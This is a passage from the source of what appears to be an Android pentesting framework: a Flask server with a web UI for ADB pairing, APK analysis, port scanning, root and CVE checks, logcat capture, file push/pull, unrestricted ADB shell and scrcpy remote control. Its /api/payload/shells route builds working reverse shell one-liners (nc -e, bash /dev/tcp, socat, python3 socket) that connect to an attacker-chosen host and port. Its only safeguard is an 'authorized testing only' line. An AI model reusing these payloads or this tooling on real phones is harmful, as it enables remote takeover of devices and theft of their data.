    '<div class="btn-group"><button class="btn qr" onclick="doQRPair()" style="flex:1;padding:14px;font-size:14px">📱 Open QR Pairing Terminal</button></div>' +
    '<div id="qrStatusBox"></div>' +
    '</div>';

  html += '<div class="card">' +
    '<h3>Method 2 — USB to Wireless</h3>' +
    '<p>Plug the phone into your PC with USB, accept the debugging prompt, then click below.</p>' +
    '<div class="btn-group"><button class="btn primary" onclick="doUSB()" style="flex:1">Enable Wireless via USB</button></div>' +
    '<div class="output" id="usbOut">Ready</div>' +
    '</div>';

  html += '<div class="card">' +
    '<h3>Method 3 — Pairing Code (Manual)</h3>' +
    '<p>On phone: Settings → Developer Options → Wireless Debugging → Pair device with pairing code</p>' +
    '<div class="fg"><label>Phone IP</label><input id="pIP" placeholder="192.168.1.42"></div>' +
    '<div class="fg"><label>Pairing Port</label><input id="pPort" placeholder="37861"></div>' +
    '<div class="fg"><label>6-Digit Pairing Code</label><input id="pCode" placeholder="482916" maxlength="6"></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="doPair()" style="flex:1">Pair Device</button></div>' +
    '<div class="fg" style="margin-top:14px"><label>Connect Port (from Wireless Debugging screen)</label><input id="cPort" placeholder="5555"></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="doConn()" style="flex:1">Connect Wireless</button></div>' +
    '<div class="output" id="pairOut">Ready</div>' +
    '</div>';
  c.innerHTML = html;
};

async function doQRPair() {
  var box = document.getElementById('qrStatusBox');
  box.innerHTML = '<div class="qr-status waiting"><div class="spinner"></div><span>Opening QR terminal...</span></div>';
  log('Opening QR pairing terminal...', 'info');
  try {
    var res = await api('/api/qr/start', { method: 'POST' });
    if (!res.success) {
      box.innerHTML = '<div class="qr-status error"><span>❌ ' + (res.output || 'Failed to open terminal') + '</span></div>';
      log('QR start failed: ' + (res.output || 'unknown'), 'error');
      return;
    }
    box.innerHTML = '<div class="qr-status waiting"><div class="spinner"></div><span>📱 Scan the QR code in the terminal window with your phone...</span></div>';
    log('QR terminal opened — waiting for scan', 'info');
    startQRPolling();
  } catch (e) {
    box.innerHTML = '<div class="qr-status error"><span>❌ ' + e.message + '</span></div>';
    log('QR error: ' + e.message, 'error');
  }
}

function startQRPolling() {
  if (qrPollTimer) clearInterval(qrPollTimer);
  var elapsed = 0;
  qrPollTimer = setInterval(async function() {
    elapsed += 3;
    try {
      var res = await api('/api/qr/poll');
      if (res.connected && res.device) {
        clearInterval(qrPollTimer);
        qrPollTimer = null;
        var box = document.getElementById('qrStatusBox');
        if (box) box.innerHTML = '<div class="qr-status success"><span>✅ Connected! Device: ' + res.device + '</span></div>';
        log('QR pairing successful: ' + res.device, 'success');
        await refreshDevs();
        setTimeout(function() {
          var sel = document.getElementById('devSelect');
          if (sel.options.length > 0 && sel.options[0].value) {
            sel.selectedIndex = 0;
            selDev();
          }
        }, 500);
      } else if (elapsed > 180) {
        clearInterval(qrPollTimer);
        qrPollTimer = null;
        var box2 = document.getElementById('qrStatusBox');
        if (box2) box2.innerHTML = '<div class="qr-status error"><span>⏱ Timeout — no device connected</span></div>';
        log('QR pairing timed out', 'warn');
      }
    } catch (e) { }
  }, 3000);
}

async function doUSB() {
  var out = document.getElementById('usbOut');
  out.textContent = 'Processing...';
  try {
    var res = await api('/api/connect/usb', { method: 'POST' });
    out.textContent = res.output || 'No output';
    if (res.success) {
      log('Wireless enabled: ' + res.ip + ':' + res.port, 'success');
      alert('Success!\nIP: ' + res.ip + '\nPort: ' + res.port + '\n\nYou can now unplug the USB cable.');
      setTimeout(refreshDevs, 2000);
    } else {
      log('Failed: ' + (res.output || 'unknown'), 'error');
    }
  } catch (e) {
    out.textContent = 'Error: ' + e.message;
  }
}

async function doPair() {
  var ip = document.getElementById('pIP').value.trim();
  var port = document.getElementById('pPort').value.trim();
  var code = document.getElementById('pCode').value.trim();
  if (!ip || !port || !code) { alert('Fill all three fields'); return; }
  var out = document.getElementById('pairOut');
  out.textContent = 'Pairing...';
  try {
    var res = await api('/api/pair', { method: 'POST', body: { ip: ip, port: port, code: code } });
    out.textContent = res.output;
    log(res.success ? 'Paired successfully' : 'Pair failed', res.success ? 'success' : 'error');
    if (res.success) {
      alert('Paired! Now enter the CONNECT PORT from the Wireless Debugging screen and click Connect Wireless.');
    }
  } catch (e) {
    out.textContent = 'Error: ' + e.message;
  }
}

async function doConn() {
  var ip = document.getElementById('pIP').value.trim();
  var port = document.getElementById('cPort').value.trim() || '5555';
  if (!ip) { alert('Enter the phone IP'); return; }
  try {
    var res = await api('/api/connect', { method: 'POST', body: { ip: ip, port: port } });
    log(res.output, res.success ? 'success' : 'error');
    if (res.success) {
      alert('Connected! Refreshing device list...');
      setTimeout(refreshDevs, 1500);
    }
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

views.device = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Device Information</h3>' +
    '<div class="btn-group">' +
    '<button class="btn primary" onclick="getInfo()" style="flex:1">Fetch Info</button>' +
    '<button class="btn" onclick="getScrn()">Screenshot</button>' +
    '</div>' +
    '<div class="output" id="infoOut">Click Fetch Info</div>' +
    '</div>';
};

async function getInfo() {
  if (!curDev) { alert('Select a device first'); return; }
  var out = document.getElementById('infoOut');
  out.textContent = 'Fetching...';
  try {
    var info = await api('/api/device/' + encodeURIComponent(curDev) + '/info');
    var s = '';
    for (var k in info) {
      s += k.padEnd(20, ' ') + ': ' + info[k] + '\n';
    }
    out.textContent = s;
    log('Device info fetched', 'success');
  } catch (e) {
    out.textContent = 'Error: ' + e.message;
  }
}

async function getScrn() {
  if (!curDev) { alert('Select a device first'); return; }
  try {
    var res = await api('/api/device/' + encodeURIComponent(curDev) + '/shot');
    log('Screenshot: ' + res.path, 'success');
  } catch (e) {
    log('Screenshot failed: ' + e.message, 'error');
  }
}

views.apk = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>APK Static Analyzer</h3>' +
    '<div class="fg"><label>APK File Path</label><input id="apkPath" placeholder="/path/to/app.apk"></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="anaAPK()" style="flex:1">Analyze APK</button></div>' +
    '<div class="output" id="apkOut">Ready</div>' +
    '</div>';
};

async function anaAPK() {
  var path = document.getElementById('apkPath').value.trim();
  if (!path) { alert('Enter APK path'); return; }
  var out = document.getElementById('apkOut');
  out.textContent = 'Analyzing...';
  try {
    var data = await api('/api/apk/analyze', { method: 'POST', body: { path: path } });
    var s = 'HASHES\n';
    for (var a in data.hashes) s += '  ' + a + ': ' + data.hashes[a] + '\n';
    s += '\nMANIFEST\n';
    for (var k in data.manifest) s += '  ' + k + ': ' + data.manifest[k] + '\n';
    s += '  Debuggable: ' + data.debuggable + '\n';
    s += '  Backup: ' + data.backup + '\n';
    if (data.dangerous_permissions.length) {
      s += '\nDANGEROUS PERMISSIONS (' + data.dangerous_permissions.length + ')\n';
      for (var i = 0; i < data.dangerous_permissions.length; i++) {
        var p = data.dangerous_permissions[i];
        s += '  [' + p.severity + '] ' + p.permission + '\n';
      }
    }
    if (data.secrets.length) {
      s += '\nHARDCODED SECRETS (' + data.secrets.length + ')\n';
      for (var j = 0; j < data.secrets.length; j++) {
        var sec = data.secrets[j];
        s += '  [' + sec.type + '] ' + sec.snippet + '\n';
      }
    }
    if (data.urls.length) {
      s += '\nURLS (' + data.urls.length + ')\n';
      for (var u = 0; u < Math.min(10, data.urls.length); u++) {
        s += '  ' + data.urls[u] + '\n';
      }
    }
    if (data.vulns.length) {
      s += '\nVULNERABILITIES (' + data.vulns.length + ')\n';
      for (var v = 0; v < data.vulns.length; v++) {
        s += '  [' + data.vulns[v].severity + '] ' + data.vulns[v].name + '\n';
      }
    }
    out.textContent = s;
    log('APK analysis complete', 'success');
    refreshStats();
  } catch (e) {
    out.textContent = 'Error: ' + e.message;
    log('APK error: ' + e.message, 'error');
  }
}

views.network = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Network Scanner</h3>' +
    '<div class="fg"><label>Target IP / Host</label><input id="tarIP" placeholder="192.168.1.1"></div>' +
    '<div class="btn-group">' +
    '<button class="btn" onclick="useDevIP()">Use Device IP</button>' +
    '<button class="btn primary" onclick="scanPorts()" style="flex:1">Scan Ports</button>' +
    '</div>' +
    '<div class="output" id="scanOut">Ready</div>' +
    '</div>';
};

async function useDevIP() {
  if (!curDev) { alert('Select a device first'); return; }
  try {
    var res = await api('/api/device/' + encodeURIComponent(curDev) + '/ip');
    if (res.ip) document.getElementById('tarIP').value = res.ip;
    else alert('Could not determine device IP');
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

async function scanPorts() {
  var tar = document.getElementById('tarIP').value.trim();
  if (!tar) { alert('Enter a target'); return; }
  var out = document.getElementById('scanOut');
  out.textContent = 'Scanning ' + tar + '...';
  try {
    var res = await api('/api/scan/ports', { method: 'POST', body: { target: tar } });
    var s = 'Open Ports on ' + res.target + ':\n';
    if (!res.open_ports.length) {
      s += '  No open ports found\n';
    } else {
      for (var i = 0; i < res.open_ports.length; i++) {
        var p = res.open_ports[i];
        s += '  ' + p + ' (' + res.services[String(p)] + ')\n';
      }
    }
    out.textContent = s;
    log('Port scan complete: ' + res.open_ports.length + ' open', 'success');
  } catch (e) {
    out.textContent = 'Error: ' + e.message;
  }
}

views.vuln = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Vulnerability Scanner</h3>' +
    '<div class="btn-group">' +
    '<button class="btn primary" onclick="vulnScan()" style="flex:1">Full Scan</button>' +
    '<button class="btn" onclick="checkRoot()">Root Check</button>' +
    '<button class="btn" onclick="checkCVE()">CVE Check</button>' +
    '</div>' +
    '<div class="output" id="vulnOut">Ready</div>' +
    '</div>';
};

async function vulnScan() {
  if (!curDev) { alert('Select a device first'); return; }
  var out = document.getElementById('vulnOut');
  out.textContent = 'Scanning...';
  try {
    var res = await api('/api/vuln/scan', { method: 'POST', body: { device_id: curDev } });
    var s = '';
    if (!res.findings.length) s = 'No vulnerabilities found.';
    for (var i = 0; i < res.findings.length; i++) {
      var f = res.findings[i];
      s += '[' + f.severity + '] ' + f.name + '\n  ' + f.detail + '\n\n';
    }
    out.textContent = s;
    log('Vulnerability scan complete', 'success');
    refreshStats();
  } catch (e) {
    out.textContent = 'Error: ' + e.message;
  }
}

async function checkRoot() {
  if (!curDev) { alert('Select a device first'); return; }
  try {
    var res = await api('/api/vuln/root/' + encodeURIComponent(curDev));
    document.getElementById('vulnOut').textContent =
      'Rooted: ' + res.rooted + '\nMethods: ' + (res.methods.length ? res.methods.join(', ') : 'none');
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

async function checkCVE() {
  if (!curDev) { alert('Select a device first'); return; }
  try {
    var res = await api('/api/vuln/cve/' + encodeURIComponent(curDev));
    var s = '';
    if (!res.cves.length) s = 'No mapped CVEs for this SDK.';
    for (var i = 0; i < res.cves.length; i++) {
      var cve = res.cves[i];
      s += '[' + cve.severity + '] ' + cve.cve + '\n  ' + cve.detail + '\n\n';
    }
    document.getElementById('vulnOut').textContent = s;
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

views.payload = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Reverse Shell Payloads</h3>' +
    '<div class="fg"><label>LHOST (your IP)</label><input id="lh" value="10.0.0.1"></div>' +
    '<div class="fg"><label>LPORT (your port)</label><input id="lp" value="4444"></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="genPay()" style="flex:1">Generate</button></div>' +
    '<div class="output" id="payOut">Ready</div>' +
    '</div>';
};

async function genPay() {
  var lh = document.getElementById('lh').value;
  var lp = document.getElementById('lp').value;
  try {
    var res = await api('/api/payload/shells', { method: 'POST', body: { lhost: lh, lport: lp } });
    var s = '';
    for (var i = 0; i < res.shells.length; i++) {
      var sh = res.shells[i];
      s += '[' + sh.method + ']\n  ' + sh.cmd + '\n\n';
    }
    document.getElementById('payOut').textContent = s;
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

views.report = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Report Generator</h3>' +
    '<div class="fg"><label>Target Name</label><input id="tarName" value="Unknown"></div>' +
    '<div class="btn-group">' +
    '<button class="btn primary" onclick="genRep()" style="flex:1">Generate Report</button>' +
    '<button class="btn" onclick="clrSess()">Clear Session</button>' +
    '</div>' +
    '<div class="output" id="repOut">Ready</div>' +
    '</div>';
};

async function genRep() {
  var tar = document.getElementById('tarName').value;
  try {
    var res = await api('/api/report', { method: 'POST', body: { target: tar } });
    document.getElementById('repOut').textContent = 'HTML: ' + res.html + '\nJSON: ' + res.json;
    log('Report generated', 'success');
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

async function clrSess() {
  await api('/api/clear', { method: 'POST' });
  log('Session cleared', 'success');
  refreshStats();
}

views.logcat = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Logcat Analyzer</h3>' +
    '<div class="fg"><label>Lines to Capture</label><input id="lcLines" value="300"></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="capLog()" style="flex:1">Capture</button></div>' +
    '<div class="output" id="lcOut">Ready</div>' +
    '</div>';
};

async function capLog() {
  if (!curDev) { alert('Select a device first'); return; }
  var n = document.getElementById('lcLines').value;
  try {
    var res = await api('/api/device/' + encodeURIComponent(curDev) + '/logcat?lines=' + n);
    var s = 'Saved: ' + res.path + '\nSensitive pattern hits: ' + res.hits.length + '\n\n';
    for (var i = 0; i < Math.min(10, res.hits.length); i++) {
      s += res.hits[i].substring(0, 150) + '\n';
    }
    document.getElementById('lcOut').textContent = s;
    log('Logcat saved: ' + res.path, 'success');
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

views.screenshot = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Screenshot</h3>' +
    '<div class="btn-group"><button class="btn primary" onclick="getScrn()" style="flex:1">Capture Screenshot</button></div>' +
    '<div class="output" id="scrOut">Ready</div>' +
    '</div>';
};

views.packages = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Package Manager</h3>' +
    '<div class="fg"><label>Filter</label><input id="pkFilter" value="third_party"></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="lstPkg()" style="flex:1">List Packages</button></div>' +
    '<div class="output" id="pkOut">Ready</div>' +
    '</div>';
};

async function lstPkg() {
  if (!curDev) { alert('Select a device first'); return; }
  var f = document.getElementById('pkFilter').value;
  try {
    var res = await api('/api/device/' + encodeURIComponent(curDev) + '/packages?filter=' + encodeURIComponent(f));
    var s = res.packages.length + ' packages\n\n';
    for (var i = 0; i < res.packages.length; i++) {
      s += res.packages[i] + '\n';
    }
    document.getElementById('pkOut').textContent = s;
    log('Listed ' + res.packages.length + ' packages', 'success');
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

views.files = function(c) {
  var html = '<div class="card">' +
    '<h3>Pull File from Device</h3>' +
    '<div class="fg"><label>Remote Path</label><input id="remPath" placeholder="/sdcard/file.txt"></div>' +
    '<div class="fg"><label>Local Destination</label><input id="locPath" value="output"></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="doPull()" style="flex:1">Pull</button></div>' +
    '</div>';
  html += '<div class="card">' +
    '<h3>Push File to Device</h3>' +
    '<div class="fg"><label>Local File</label><input id="locPush" placeholder="/path/to/file"></div>' +
    '<div class="fg"><label>Remote Destination</label><input id="remPush" value="/sdcard/"></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="doPush()" style="flex:1">Push</button></div>' +
    '</div>';
  html += '<div class="output" id="fileOut">Ready</div>';
  c.innerHTML = html;
};

async function doPull() {
  if (!curDev) { alert('Select a device first'); return; }
  var r = document.getElementById('remPath').value;
  var l = document.getElementById('locPath').value;
  try {
    var res = await api('/api/device/' + encodeURIComponent(curDev) + '/pull',
      { method: 'POST', body: { remote: r, local: l } });
    document.getElementById('fileOut').textContent = res.success ? 'Pulled successfully' : 'Pull failed';
    log(res.success ? 'Pull OK' : 'Pull failed', res.success ? 'success' : 'error');
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

async function doPush() {
  if (!curDev) { alert('Select a device first'); return; }
  var l = document.getElementById('locPush').value;
  var r = document.getElementById('remPush').value;
  try {
    var res = await api('/api/device/' + encodeURIComponent(curDev) + '/push',
      { method: 'POST', body: { local: l, remote: r } });
    document.getElementById('fileOut').textContent = res.success ? 'Pushed successfully' : 'Push failed';
    log(res.success ? 'Push OK' : 'Push failed', res.success ? 'success' : 'error');
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

views.shell = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>ADB Shell</h3>' +
    '<div class="fg"><label>Command</label><input id="shCmd" placeholder="id, ls /sdcard, getprop..."></div>' +
    '<div class="btn-group"><button class="btn primary" onclick="runShell()" style="flex:1">Execute</button></div>' +
    '<div class="output" id="shOut">Ready</div>' +
    '</div>';
};

async function runShell() {
  if (!curDev) { alert('Select a device first'); return; }
  var cmd = document.getElementById('shCmd').value.trim();
  if (!cmd) return;
  try {
    var res = await api('/api/device/' + encodeURIComponent(curDev) + '/shell',
      { method: 'POST', body: { cmd: cmd } });
    document.getElementById('shOut').textContent = res.output || '(no output)';
    log('$ ' + cmd, 'info');
  } catch (e) {
    log('Error: ' + e.message, 'error');
  }
}

views.remote = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>Remote Control (scrcpy)</h3>' +
    '<p>Requires scrcpy installed on your system.</p>' +
    '<div class="btn-group"><button class="btn primary" onclick="doScrcpy()" style="flex:1">Launch Screen</button></div>' +
    '<div class="output" id="rmOut">Ready</div>' +
    '</div>';
};

async function doScrcpy() {
  if (!curDev) { alert('Select a device first'); return; }
  try {
    await api('/api/device/' + encodeURIComponent(curDev) + '/scrcpy', { method: 'POST' });
    document.getElementById('rmOut').textContent = 'Launched';
    log('scrcpy launched', 'success');
  } catch (e) {
    document.getElementById('rmOut').textContent = 'Error: ' + e.message;
  }
}

views.about = function(c) {
  c.innerHTML = '<div class="card">' +
    '<h3>About DANIYAL KHAN PRO</h3>' +
    '<table style="width:100%;font-size:13px;line-height:2">' +
    '<tr><td style="color:var(--accent);font-weight:600;width:140px">Tool</td><td>DANIYAL KHAN PRO</td></tr>' +
    '<tr><td style="color:var(--accent);font-weight:600">Version</td><td>10.1.0</td></tr>' +
    '<tr><td style="color:var(--accent);font-weight:600">Author</td><td>DANIYAL KHAN</td></tr>' +
    '<tr><td style="color:var(--accent);font-weight:600">Instagram</td><td>@hexsecteam</td></tr>' +
    '<tr><td style="color:var(--accent);font-weight:600">Platform</td><td>Kali Linux / Windows / macOS</td></tr>' +
    '</table>' +
    '<p style="margin-top:16px;color:var(--dim);font-size:12px">For authorized security testing only.</p>' +
    '</div>';
};

window.addEventListener('DOMContentLoaded', function() {
  buildNav();
  showView('dashboard');
  refreshDevs();

  fetch('/api/version')
    .then(function(r) { return r.json(); })
    .then(function(v) {
      var st = document.getElementById('adbStat');
      if (v.adb_available) {
        st.textContent = 'ADB Ready';
        st.parentElement.style.color = '#51cf66';
      } else {
        st.textContent = 'ADB Not Found';
        st.parentElement.style.color = '#ff6b6b';
      }
    })
    .catch(function() {});

  log('DANIYAL KHAN PRO v10.1.0 initialized', 'success');
  log('Select Connect Device to pair your phone', 'info');
});
</script>
</body>
</html>
"""


# ═══════════════════════════════════════════════════════════════════════════════
#  ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/")
def index():
    return Response(HTML, mimetype="text/html")

@app.route("/api/version")
def api_version():
    ok, info = check_adb()
    return jsonify({"adb_available": ok, "adb_info": info,
                    "version": VERSION, "system": SYSTEM})

@app.route("/api/devices")
def api_devices():
    return jsonify({"devices": list_devices()})

@app.route("/api/connect/usb", methods=["POST"])
def api_connect_usb():
    return jsonify(usb_to_wifi())

@app.route("/api/pair", methods=["POST"])
def api_pair():
    d = request.json or {}
    return jsonify(do_pair(d.get("ip", ""), d.get("port", ""), d.get("code", "")))

@app.route("/api/connect", methods=["POST"])
def api_connect():
    d = request.json or {}
    return jsonify(do_connect(d.get("ip", ""), d.get("port", "5555")))

@app.route("/api/qr/start", methods=["POST"])
def api_qr_start():
    """Open a new terminal window with the QR code for pairing."""
    try:
        ok, msg = fix_mdns()
    except Exception as e:
        print("[QR] mdns fix error:", e)
    time.sleep(0.5)
    ok, msg = open_qr_terminal()
    return jsonify({"success": ok, "output": msg})

@app.route("/api/qr/poll")
def api_qr_poll():
    """Check if a device has connected after QR scan."""
    devs = list_devices()
    if devs:
        return jsonify({"connected": True, "device": devs[0]["serial"],
                        "model": devs[0]["model"]})
    return jsonify({"connected": False})

@app.route("/api/device/<d>/info")
def api_dev_info(d):
    return jsonify(device_info(d))

@app.route("/api/device/<d>/ip")
def api_dev_ip(d):
    return jsonify({"ip": device_ip(d)})

@app.route("/api/device/<d>/packages")
def api_dev_pkg(d):
    return jsonify({"packages": packages(d, request.args.get("filter", "all"))})

@app.route("/api/device/<d>/shell", methods=["POST"])
def api_dev_shell(d):
    cmd = (request.json or {}).get("cmd", "")
    out, rc = adb(["shell", cmd], d)
    return jsonify({"output": out, "returncode": rc})

@app.route("/api/device/<d>/logcat")
def api_dev_lc(d):
    try:
        n = int(request.args.get("lines", 300))
    except ValueError:
        n = 300
    out, path, hits = logcat(d, n)
    return jsonify({"output": out[:5000], "path": path, "hits": hits[:50]})

@app.route("/api/device/<d>/shot")
def api_dev_shot(d):
    return jsonify({"path": screenshot(d)})

@app.route("/api/device/<d>/pull", methods=["POST"])
def api_pull(d):
    j = request.json or {}
    _, rc = adb(["pull", j.get("remote", ""), j.get("local", OUT)], d, 120)
    return jsonify({"success": rc == 0})

@app.route("/api/device/<d>/push", methods=["POST"])
def api_push(d):
    j = request.json or {}
    _, rc = adb(["push", j.get("local", ""), j.get("remote", "/sdcard/")], d, 120)
    return jsonify({"success": rc == 0})

@app.route("/api/apk/analyze", methods=["POST"])
def api_apk():
    p = (request.json or {}).get("path", "").strip()
    if not p or not os.path.isfile(p):
        return jsonify({"error": "APK file not found"}), 400
    f = analyze_apk(p)
    for v in f["vulns"]:
        _S["findings"].append(v)
    return jsonify(f)

@app.route("/api/scan/ports", methods=["POST"])
def api_scan():
    t = (request.json or {}).get("target", "").strip()
    if not t:
        return jsonify({"error": "No target provided"}), 400
    op = port_scan(t)
    services = {str(p): COMMON_PORTS.get(p, "Unknown") for p in op}
    return jsonify({"target": t, "open_ports": op, "services": services})

@app.route("/api/vuln/scan", methods=["POST"])
def api_vuln():
    d = (request.json or {}).get("device_id")
    if not d:
        return jsonify({"error": "No device provided"}), 400
    findings = [{"name": c["cve"], "severity": c["severity"], "detail": c["detail"]}
                for c in check_cves(d)]
    r = check_root(d)
    if r["rooted"]:
        findings.append({"name": "Device Rooted", "severity": "HIGH",
                         "detail": ", ".join(r["methods"])})
    for f in findings:
        _S["findings"].append(f)
    return jsonify({"findings": findings})

@app.route("/api/vuln/root/<d>")
def api_root(d):
    return jsonify(check_root(d))

@app.route("/api/vuln/cve/<d>")
def api_cve(d):
    return jsonify({"cves": check_cves(d)})

@app.route("/api/payload/shells", methods=["POST"])
def api_shells():
    j = request.json or {}
    lh = j.get("lhost", "")
    lp = j.get("lport", "4444")
    return jsonify({"shells": [
        {"method": "busybox nc", "cmd": "busybox nc " + lh + " " + lp + " -e /system/bin/sh"},
        {"method": "nc traditional", "cmd": "nc -e /system/bin/sh " + lh + " " + lp},
        {"method": "bash TCP", "cmd": "bash -i >& /dev/tcp/" + lh + "/" + lp + " 0>&1"},
        {"method": "socat", "cmd": "socat exec:'/system/bin/sh -i',pty,stderr tcp:" + lh + ":" + lp},
        {"method": "python3",
         "cmd": "python3 -c 'import socket,os,subprocess;s=socket.socket();"
                "s.connect((\"" + lh + "\"," + lp + "));"
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
                "subprocess.call([\"/system/bin/sh\",\"-i\"])'"},
    ]})

@app.route("/api/session")
def api_session():
    return jsonify(_S)

@app.route("/api/report", methods=["POST"])
def api_report():
    d = request.json or {}
    _S["target"] = d.get("target", "Unknown")
    hp = build_reports()
    return jsonify({"html": hp, "json": hp.replace(".html", ".json")})

@app.route("/api/clear", methods=["POST"])
def api_clear():
    _S["findings"] = []
    _S["permissions"] = []
    _S["secrets"] = []
    _S["urls"] = []
    return jsonify({"success": True})

@app.route("/api/device/<d>/scrcpy", methods=["POST"])
def api_scrcpy(d):
    if not tool_exists("scrcpy"):
        return jsonify({"error": "scrcpy not installed. Install: sudo apt install scrcpy"}), 400
    try:
        subprocess.Popen(["scrcpy", "-s", d, "--window-title", "DANIYAL KHAN Remote"])
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY
# ═══════════════════════════════════════════════════════════════════════════════

def open_browser():
    time.sleep(1.5)
    try:
        webbrowser.open("http://" + HOST + ":" + str(PORT))
    except Exception:
        pass


if __name__ == "__main__":
    os.system("clear" if SYSTEM != "Windows" else "cls")
    print("=" * 78)
    print(" " * 22 + "DANIYAL KHAN PRO v" + VERSION)
    print(" " * 14 + "Professional Android Pentesting Framework")
    print("=" * 78)
    print("  System  : " + SYSTEM)
    print("  Author  : " + AUTHOR + " | Instagram: " + INSTAGRAM)
    ok, info = check_adb()
    print("  ADB     : " + ("READY — " + info if ok else "NOT FOUND"))
    if not ok:
        print("            Linux  : sudo apt install android-tools-adb")
        print("            Windows: install platform-tools from developer.android.com")
    qr = find_qr_tool()
    print("  QR Tool : " + (qr if qr else "NOT FOUND — install: pip install adb-wifi-qr"))
    print("  Web UI  : http://" + HOST + ":" + str(PORT))
    print("=" * 78)
    print("  Browser will open automatically...")
    print("  Press Ctrl+C to stop")
    print("=" * 78)
    threading.Thread(target=open_browser, daemon=True).start()
    try:
        app.run(host=HOST, port=PORT, debug=False, use_reloader=False, threaded=True)
    except KeyboardInterrupt:
        print("\n" + "=" * 78)
        print("  DANIYAL KHAN PRO stopped. Stay ethical.")
        print("=" * 78)